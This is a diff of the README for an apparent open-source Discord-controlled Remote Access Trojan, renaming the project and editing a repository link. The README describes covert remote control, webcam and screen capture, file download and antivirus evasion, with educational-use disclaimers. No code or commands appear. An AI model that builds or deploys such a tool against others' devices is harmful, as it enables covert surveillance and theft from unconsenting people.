@@ -1,7 +1,7 @@
-# Discord Access Trojan (DAT)
+# Discord RAT
 
 ## Description
-Discord Access Trojan (DAT) is a Remote Access Trojan (RAT) designed to enable remote control and monitoring of target devices. It offers a range of features, including capturing screenshots, taking webcam photos, retrieving system information, downloading files remotely, and more. Please note that this tool is created for educational and ethical purposes exclusively. Unauthorized use is strictly prohibited.
+Discord RAT is a Remote Access Trojan (RAT) designed to enable remote control and monitoring of target devices. It offers a range of features, including capturing screenshots, taking webcam photos, retrieving system information, downloading files remotely, and more. Please note that this tool is created for educational and ethical purposes exclusively. Unauthorized use is strictly prohibited.
 
 ## Features
 - [x] Capture screenshots
@@ -44,7 +44,7 @@ This RAT is designed to evade detection by traditional antivirus software. Howev
 Contributions to this project are welcome. If you find any issues or have suggestions for improvements, feel free to open an issue or submit a pull request.
 
 ## License
-DAT is released under the MIT License. See the [LICENSE](https://github.com/agent-alli0t/Discord-RAT/blob/main/LICENSE) file for more details.
+DAT is released under the MIT License. See the [LICENSE](https://github.com/agent-elli0t/Discord-RAT/blob/main/LICENSE) file for more details.
 
 ## Disclaimer
 The creators of this project are not responsible for any unauthorized use or misuse of the software. This tool is intended for educational and ethical purposes only. Use it responsibly and only on devices that you own or have explicit permission to access.
